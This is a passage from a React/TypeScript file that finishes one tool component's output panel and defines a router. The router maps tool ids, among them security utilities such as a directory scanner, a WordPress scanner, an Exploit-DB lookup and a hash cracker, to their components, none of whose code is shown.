          <pre className="text-xs font-mono text-neon-green whitespace-pre-wrap drop-shadow-[0_0_2px_rgba(57,255,20,0.5)]">
            {result || 'Waiting for code snippet...'}
          </pre>
        </div>
      </div>
    </CustomToolLayout>
  );
}


export function CustomToolRouter({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  switch (tool.id) {
    case 'qr_gen': return <QrGenTool tool={tool} onClose={onClose} />;
    case 'otp': return <OtpDecoderTool tool={tool} onClose={onClose} />;
    case 'passwords': return <PasswordsTool tool={tool} onClose={onClose} />;
    case 'speed': return <SpeedTestTool tool={tool} onClose={onClose} />;
    case 'cipher': return <CipherTool tool={tool} onClose={onClose} />;
    case 'security': return <SecurityCheckTool tool={tool} onClose={onClose} />;
    case 'notes': return <NotesTool tool={tool} onClose={onClose} />;
    case 'ip_calc': return <IpCalcTool tool={tool} onClose={onClose} />;
    case 'hackbar': return <HackbarTool tool={tool} onClose={onClose} />;
    case 'device': return <DeviceInfoTool tool={tool} onClose={onClose} />;
    case 'nfc': return <NfcTool tool={tool} onClose={onClose} />;
    case 'bluetooth': return <BluetoothTool tool={tool} onClose={onClose} />;
    case 'cve': return <CveTool tool={tool} onClose={onClose} />;
    case 'exploitdb': return <ExploitdbTool tool={tool} onClose={onClose} />;
    case 'phone_crawl': return <PhoneCrawlTool tool={tool} onClose={onClose} />;
    case 'dns': return <DnsTool tool={tool} onClose={onClose} />;
    case 'dir_scan': return <DirScannerTool tool={tool} onClose={onClose} />;
    case 'spider': return <SpiderTool tool={tool} onClose={onClose} />;
    case 'react_scan': return <ReactScannerTool tool={tool} onClose={onClose} />;
    case 'wp_scan': return <WpScannerTool tool={tool} onClose={onClose} />;
    case 'net_scan': return <NetScannerTool tool={tool} onClose={onClose} />;
    case 'whois': return <WhoisTool tool={tool} onClose={onClose} />;
    case 'graphql_scan': return <GraphqlTool tool={tool} onClose={onClose} />;
    case 'ai_assistant': return <AiTool tool={tool} onClose={onClose} />;
    case 'default_creds': return <DefaultCredsTool tool={tool} onClose={onClose} />;
    case 'hash_cracker': return <HashCrackerTool tool={tool} onClose={onClose} />;
    default: return null;
  }
}


